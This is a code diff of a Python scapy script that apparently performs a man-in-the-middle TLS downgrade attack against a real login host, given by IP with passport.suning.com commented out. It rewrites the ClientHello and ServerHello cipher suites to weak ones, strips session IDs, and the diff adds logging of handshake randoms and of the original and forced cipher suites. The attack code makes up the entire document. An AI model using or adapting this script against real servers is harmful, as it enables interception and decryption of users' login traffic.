@@ -1,13 +1,8 @@
 #!/usr/bin/env python
 #encoding: utf-8
 
-from scapy.all import *
-import struct
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
+from header import *
 
-useOrinAddr = False
-doProcess = True
 
 #ip = 'passport.suning.com'
 ip = '119.188.139.98'
@@ -46,8 +41,21 @@ def getD(pubkey):
 
 
 def clienthelloprocess(csession, ssession, p):
+    print "Version:%s"%(TLS_VERSIONS[p[TLSHandshake].version])
+    print "ClientRandom:%s"%p[TLSHandshake].random_bytes.encode('hex')
+    cslist = p[TLSHandshake].cipher_suites
+    print "OriginalCipherSuites:"
+    for i in cslist:
+        print "\t%s"%parseCS(i)
+    
     p[TLSHandshake].cipher_suites_length = 2
     p[TLSHandshake].cipher_suites = 3
+
+    cslist = p[TLSHandshake].cipher_suites
+    print "ChangedCipherSuites:"
+    for i in cslist:
+        print "\t%s"%parseCS(i)
+
     p[TLSHandshake].session_id_length = 0
     p[TLSHandshake].session_id=None
     p[TLSHandshake].length = len(str(p[TLSClientHello]))
@@ -55,7 +63,11 @@ def clienthelloprocess(csession, ssession, p):
     return p
 
 def serverhelloprocess(csession, ssession, p):
-    p[TLSHandshake].cipher_suites = 4
+    print "ServerRandom:%s"%p[TLSHandshake].random_bytes.encode('hex')
+    print "OriginalCipherSuite:%s"%parseCS(p[TLSHandshake].cipher_suite)
+    p[TLSHandshake].cipher_suite = 4
+    print "ChangedCipherSuite:%s"%parseCS(p[TLSHandshake].cipher_suite)
+    print "CompressionMethod:%s"%p[TLSHandshake].compression_method
     p[TLSHandshake].session_id_length = 0
     p[TLSHandshake].session_id=None
     p[TLSHandshake].length = len(str(p[TLSServerHello]))
